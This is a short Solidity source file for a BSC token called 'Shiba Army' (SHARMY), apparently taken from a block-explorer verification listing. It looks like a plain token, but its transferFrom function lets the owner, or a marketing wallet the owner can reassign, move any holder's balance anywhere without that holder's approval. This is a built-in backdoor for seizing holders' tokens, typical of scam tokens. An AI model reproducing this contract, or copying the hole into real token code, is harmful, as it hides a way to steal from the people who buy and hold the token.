/**
 *Submitted for verification at BscScan.com on 2023-03-26
*/

pragma solidity ^0.5.16;

contract ShibaArmy {
    string public constant name = "Shiba Army";
    string public constant symbol = "SHARMY";
    uint256 public constant decimals = 18;
    uint256 public totalSupply;
    
    mapping (address => uint256) public balanceOf;
    address public owner;
    address public marketingWallet;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed burner, uint256 value);

    constructor() public {
        owner = msg.sender;
        totalSupply = 100000000000 * (10 ** uint256(decimals));
        balanceOf[owner] = totalSupply;
    }

    function transfer(address _to, uint256 _value) public {
        require(balanceOf[msg.sender] >= _value && _value > 0, "Insufficient balance.");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public {
        require(balanceOf[_from] >= _value && _value > 0, "Insufficient balance.");
        require(msg.sender == owner || msg.sender == marketingWallet, "Unauthorized transfer.");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }

    function burn(uint256 _value) public {
        require(balanceOf[msg.sender] >= _value && _value > 0, "Insufficient balance.");
        balanceOf[msg.sender] -= _value;
        totalSupply -= _value;
        emit Burn(msg.sender, _value);
    }

    function setMarketingWallet(address _marketingWallet) public {
        require(msg.sender == owner, "Unauthorized action.");
        marketingWallet = _marketingWallet;
    }
}